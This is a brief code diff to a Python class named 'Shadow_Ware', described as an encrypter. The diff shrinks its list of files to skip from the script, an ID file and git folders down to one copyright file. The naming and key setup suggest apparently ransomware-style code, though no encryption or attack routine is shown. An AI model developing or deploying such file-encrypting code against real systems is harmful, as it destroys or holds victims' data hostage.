@@ -3,12 +3,7 @@ import base64, os, hashlib, hmac
 """ Class for encrypter """
 class Shadow_Ware():
   def __init__(self):
-    self.ignored_files = [
-      "ID.id",
-      "encrypter.py",
-      ".git",
-      'hooks', 'refs', 'info', 'lfs', 'logs', 'objects', 'branches', 'remotes', 'heads', 'tags', 'origin', 'tmp', 'refs', 'remotes', 'heads', 'origin', 'pack', 'info'  
-    ]
+    self.ignored_files = ["Copyright Preston E.md"]
 
     # Keys and ID
     self.bytes_key = self.get_key()
